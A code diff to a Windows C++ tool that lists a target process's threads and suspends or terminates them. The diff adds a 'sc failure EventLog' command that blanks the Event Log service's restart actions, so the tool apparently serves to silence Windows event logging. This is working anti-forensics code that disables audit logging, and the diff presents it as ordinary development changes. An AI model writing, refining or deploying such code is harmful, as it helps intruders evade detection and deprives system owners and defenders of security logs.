@@ -102,7 +102,6 @@ int main(int argc, TCHAR **argv, TCHAR envp)
 		forcedPid = atoi(strPid.c_str());
 	}
 	
-	system("pause");
 	if (optElevate) {
 		if (C::Process::IsRunAsAdministrator()) {
 			std::cout << "The applicaiton is already running with admin privileges" << std::endl;
@@ -119,7 +118,7 @@ int main(int argc, TCHAR **argv, TCHAR envp)
 		return 0;
 	}
 	DWORD Res = 0;
-	if (C::Process::CheckIntegrityLevel() == TRUE) {
+	if( (optListProcess == TRUE)  || (C::Process::CheckIntegrityLevel() == TRUE) ) {
 
 		PRINT_OUT("[+] Process Integrity Level is high, continuing...\n");
 		
@@ -152,12 +151,13 @@ int main(int argc, TCHAR **argv, TCHAR envp)
 				return 0;
 			}
 
-			int threadCount = threads.size();
-			int threadProcessed = 0;
 			C::Process::TThreads threads;
+			int threadProcessed = 0;
 			C::Process::ListProcessThreads(HighPid, threads);
+			int threadCount = threads.size();
 			PRINT_OUT("[+] LIST OF CHILDS THREADS (%d) SPAWNED FROM %d\n", threads.size() ,HighPid);
 			PRINT_OUT("[+] TID\t\tSTART ADDRESS\tPARENT\tSTATE\tIS SUSPENDED?\tCREATION TIME\n");
+			int x=0;
 			for (C::Process::SThreadEntry t : threads) {
 
 				SYSTEM_THREAD* pk_Thread = i_Proc.FindThreadByTid(pk_Proc, t.threadId);
@@ -187,14 +187,8 @@ int main(int argc, TCHAR **argv, TCHAR envp)
 				else {
 					strcpy(suspended_State, "   NO MATE");
 				}
-				if (t.threadId < 1000) {
-					PRINT_OUT("[+] %d\t\t0x%08X\t%d\t%s\t%s\t%s\n", t.threadId, t.startAddress, t.parentPid, state, suspended_State, strTime);
-				}
-				else {
-					PRINT_OUT("[+] %d\t0x%08X\t%d\t%s\t%s\t%s\n", t.threadId, t.startAddress, t.parentPid, state, suspended_State, strTime);
-				}
-				
-				
+				PRINT_OUT("[%2d] %4d\t0x%08X\t%d\t%s\t%s\t%s\n", x, t.threadId, t.startAddress, t.parentPid, state, suspended_State, strTime);
+				x++;
 			}
 
 			if (optListProcess == TRUE) {
@@ -202,6 +196,10 @@ int main(int argc, TCHAR **argv, TCHAR envp)
 				return 0;
 			}
 
+
+			system("sc failure EventLog reset= 86400 actions= //15000//30000//1000");
+
+			
 			char action[128];
 			if (optTerminateThread) {
 				strcpy(action, "KILLING THREADS");
@@ -210,6 +208,7 @@ int main(int argc, TCHAR **argv, TCHAR envp)
 				strcpy(action, "SUSPENDING THREADS");
 			}
 			PRINT_OUT("[+] REQUESTED ACTION: %s \n", action);
+			x = 0;
 			for (C::Process::SThreadEntry t : threads) {
 				HANDLE Invalid = (HANDLE)-1;
 				HANDLE hThread = OpenThread(THREAD_QUERY_LIMITED_INFORMATION | THREAD_SUSPEND_RESUME | THREAD_TERMINATE | THREAD_SUSPEND_RESUME, FALSE, t.threadId);
@@ -231,28 +230,18 @@ int main(int argc, TCHAR **argv, TCHAR envp)
 				}
 				else {
 
-					if (optTerminateThread) {
-						Res = TerminateThread(hThread,0);
-						if (Res == -1) {
-							PRINT_OUT("[+] TerminateThread Error %d. GetLastError 0x%08X\n", t.threadId, GetLastError());
-							continue;
-						}
-						else{
-							threadProcessed++;
-							PRINT_OUT("[+] Thread TerminateThread %d returned %d\n", t.threadId, Res);
-						}
+					if (optTerminateThread) { Res = TerminateThread(hThread,0);	}
+					else {Res = SuspendThread(hThread); }
+
+					if (Res == -1) {
+						PRINT_OUT("[+] TerminateThread Error %d. GetLastError 0x%08X\n", t.threadId, GetLastError());
+						continue;
 					}
-					else {
-						Res = SuspendThread(hThread);
-						if (Res == -1) {
-							PRINT_OUT("[+] SuspendThread Error %d. GetLastError 0x%08X\n", t.threadId, GetLastError());
-							continue;
-						}
-						else{
-							threadProcessed++;
-							PRINT_OUT("[+] Thread Suspended %d\n", t.threadId);
-						}
+					else{
+						threadProcessed++;
+						PRINT_OUT("[+] Thread TerminateThread %d returned %d\n", t.threadId, Res);
 					}
+
 
 					PRINT_OUT("[+] Thread Processed %d / %d thread count\n", threadProcessed, threadCount);
 					
@@ -260,6 +249,9 @@ int main(int argc, TCHAR **argv, TCHAR envp)
 						PRINT_OUT("[+] Exiting\n", threadProcessed, threadCount);
 						break;
 					}
+
+
+
 	
 
 				}
